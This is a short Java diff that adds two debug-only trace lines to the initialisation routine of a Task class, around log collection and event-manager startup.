@@ -143,11 +143,17 @@ public final class Task implements Singleton {
             }
 
             if (logCollector != null) {
+                //#ifdef DEBUG
+                debug.info("taskInit evidences");
+                //#endif
                 logCollector.initEvidences();
             }
 
             // Da qui in poi inizia la concorrenza dei thread
 
+            //#ifdef DEBUG
+            debug.trace("taskInit START ALL EVENTS");
+            //#endif
             if (eventManager.startAll() == false) {
                 //#ifdef DEBUG
                 debug.trace("eventManager FAILED");
